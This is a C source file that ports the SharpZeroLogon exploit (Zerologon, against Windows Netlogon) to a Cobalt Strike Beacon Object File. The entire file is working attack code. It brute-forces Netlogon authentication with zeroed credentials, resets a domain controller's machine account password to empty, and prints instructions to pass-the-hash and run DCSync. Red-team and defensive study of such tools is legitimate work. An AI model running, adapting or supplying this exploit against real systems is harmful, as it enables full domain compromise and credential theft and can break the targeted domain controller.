/*
 * Port of SharpZeroLogon to a Beacon Object File
 * https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon
 */

#include <windows.h>
#include <stdio.h>
#include <dsgetdc.h>
#include "beacon.h"

typedef struct _NETLOGON_CREDENTIAL {
	CHAR data[8];
} NETLOGON_CREDENTIAL, *PNETLOGON_CREDENTIAL;

typedef struct _NETLOGON_AUTHENTICATOR {
	NETLOGON_CREDENTIAL Credential;
	DWORD Timestamp;
} NETLOGON_AUTHENTICATOR, *PNETLOGON_AUTHENTICATOR;

typedef  enum _NETLOGON_SECURE_CHANNEL_TYPE{
	NullSecureChannel = 0,
	MsvApSecureChannel = 1,
	WorkstationSecureChannel = 2,
	TrustedDnsDomainSecureChannel = 3,
	TrustedDomainSecureChannel = 4,
	UasServerSecureChannel = 5,
	ServerSecureChannel = 6,
	CdcServerSecureChannel = 7
} NETLOGON_SECURE_CHANNEL_TYPE;

typedef struct _NL_TRUST_PASSWORD {
	WCHAR Buffer[256];
	ULONG Length;
} NL_TRUST_PASSWORD, *PNL_TRUST_PASSWORD;

DECLSPEC_IMPORT NTSTATUS NETAPI32$I_NetServerReqChallenge(LPWSTR PrimaryName, LPWSTR ComputerName, PNETLOGON_CREDENTIAL ClientChallenge, PNETLOGON_CREDENTIAL ServerChallenge);
DECLSPEC_IMPORT NTSTATUS NETAPI32$I_NetServerAuthenticate2(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_CREDENTIAL ClientCredential, PNETLOGON_CREDENTIAL ServerCredential, PULONG NegotiatedFlags);
DECLSPEC_IMPORT NTSTATUS NETAPI32$I_NetServerPasswordSet2(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_AUTHENTICATOR Authenticator, PNETLOGON_AUTHENTICATOR ReturnAuthenticator, PNL_TRUST_PASSWORD ClearNewPassword);

void go(char * args, int alen) {
	DWORD                  i;
	NETLOGON_CREDENTIAL    ClientCh       = {0};
	NETLOGON_CREDENTIAL    ServerCh       = {0};
	NETLOGON_AUTHENTICATOR Auth           = {0};
	NETLOGON_AUTHENTICATOR AuthRet        = {0};
	NL_TRUST_PASSWORD      NewPass        = {0};
	ULONG                  NegotiateFlags = 0x212fffff;

	datap                  parser;
	wchar_t *              dc_fqdn;		/* DC.corp.acme.com */
	wchar_t *              dc_netbios;	/* DC */
	wchar_t *              dc_account;	/* DC$ */

	/* extract our arguments */
	BeaconDataParse(&parser, args, alen);
	dc_fqdn    = (wchar_t *)BeaconDataExtract(&parser, NULL);
	dc_netbios = (wchar_t *)BeaconDataExtract(&parser, NULL);
	dc_account = (wchar_t *)BeaconDataExtract(&parser, NULL);

	for (i = 0; i < 2000; i++) {
		NETAPI32$I_NetServerReqChallenge(dc_fqdn, dc_netbios, &ClientCh, &ServerCh);
		if ((NETAPI32$I_NetServerAuthenticate2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &ClientCh, &ServerCh, &NegotiateFlags) == 0)) {
			if (NETAPI32$I_NetServerPasswordSet2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &Auth, &AuthRet, &NewPass) == 0) {
				BeaconPrintf(CALLBACK_OUTPUT, "Success! Use pth .\\%S 31d6cfe0d16ae931b73c59d7e0c089c0 and run dcscync", dc_account);
			}
			else {
				BeaconPrintf(CALLBACK_ERROR, "Failed to set machine account pass for %S", dc_account);
			}

			return;
		}
	}

	BeaconPrintf(CALLBACK_ERROR, "%S is not vulnerable", dc_fqdn);
}
